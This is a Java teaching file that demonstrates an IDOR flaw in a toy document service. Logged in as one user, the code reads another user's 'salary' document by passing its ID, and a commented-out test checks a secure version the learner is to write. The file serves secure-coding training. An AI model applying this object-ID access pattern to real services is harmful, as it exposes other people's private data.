/**
 * DocumentAccessExploit.java
 * 
 * This class demonstrates the IDOR (Insecure Direct Object Reference)
 * vulnerability in the VulnerableDocumentService.
 */
public class DocumentAccessExploit {

    public static void main(String[] args) {
        System.out.println("=== Starting IDOR Exploit Demonstration ===");

        // 1. Initialize the vulnerable service
        VulnerableDocumentService vulnerableService = new VulnerableDocumentService();

        // 2. Scenario: Bob is logged in
        String loggedInUser = "userB";

        System.out.println("\n[INFO] Logged in as: " + loggedInUser);

        // 3. Bob accesses his own data (Expected behavior)
        System.out.println("[BOB] Accessing own document (doc456)...");
        String bobsData = vulnerableService.getDocument(loggedInUser, "doc456");
        System.out.println("[RESULT] Content: " + bobsData);

        // 4. Bob attempts to access Alice's data (The Exploit)
        System.out.println("\n[BOB] Attempting to access Alice's document (doc123) via IDOR...");
        String alicesData = vulnerableService.getDocument(loggedInUser, "doc123");

        if (alicesData.contains("Secret Salary Data")) {
            System.out.println("[RESULT] EXPLOIT SUCCESSFUL! Bob accessed: " + alicesData);
        } else {
            System.out.println("[RESULT] Access failed or returned unexpected data.");
        }

        System.out.println("\n=== Demonstration Completed ===");

        /*
         * UNCOMMENT the code below once you have implemented SecureDocumentService.java
         * to verify your fix.
         */

        /*
         * System.out.println("\n=== Testing Secure Implementation ===");
         * SecureDocumentService secureService = new SecureDocumentService();
         * try {
         * System.out.
         * println("[BOB] Attempting to access Alice's document (doc123) through secure service..."
         * );
         * secureService.getDocument(loggedInUser, "doc123");
         * System.out.
         * println("[RESULT] ERROR: Secure service allowed unauthorized access!");
         * } catch (SecurityException e) {
         * System.out.
         * println("[RESULT] SUCCESS: Secure connection blocked unauthorized access: " +
         * e.getMessage());
         * }
         */
    }
}
